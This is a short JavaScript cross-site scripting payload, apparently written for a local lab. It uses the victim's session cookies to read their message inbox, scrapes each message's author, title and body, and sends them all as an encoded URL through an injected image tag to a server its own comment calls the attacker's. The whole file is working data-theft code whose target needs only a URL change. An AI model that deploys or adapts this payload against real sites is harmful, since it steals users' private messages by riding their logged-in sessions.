msgs = [];
done = 0;
var http = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
http.withCredentials = true;
http.onreadystatechange = function() {
    if (this.readyState == 4) {
        var c = document.createElement('span');
        c.innerHTML = this.responseText; 
        msg_tags = c.getElementsByTagName('tbody')[0].getElementsByTagName('tr');
        console.log(msg_tags);
        
        for (var i=0;i<msg_tags.length;i++){
            var tag = msg_tags[i];
            msgs[i] = {};
            // 
            msgs[i]['author'] = tag.getElementsByTagName('a')[0].text;
            msgs[i]['title'] = tag.getElementsByTagName('a')[1].text.replace(/\s\s/g,'');
            console.log(msgs[i]['title']);
            // The message's content is in another page
            var contentUrl = tag.getElementsByTagName('a')[1].href ;
            // we'll start an ajax request
            var http = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
            http.withCredentials = true;
            http.num = i;
            http.onreadystatechange = function() {
                if (this.readyState == 4) {
                    var c = document.createElement('span');
                    c.innerHTML = this.responseText; 
                    // finally get the content for this message
                    msgs[this.num]['content'] = c.getElementsByClassName('message_body')[0].innerHTML.replace(/\s\s/g,'') ;
                    
                    //we have one more
                    done ++;
                    // If we have all of them
                    if (done+1 == msg_tags.length){
                        // We'll add a <img> tag, to send a GET request to the attacker's server.
                        var u = 'http://localhost:1337/'+encodeURIComponent(JSON.stringify(msgs));
                        var s = document.createElement('img');
                        s.src = u;
                        document.getElementsByTagName('body')[0].appendChild(s);
                    }
                }
            };
            http.open('GET', contentUrl, true); 
            http.send();
        }

        
    };
}

http.open('GET', 'http://localhost:8080/user/messages/inbox', true); 
http.send();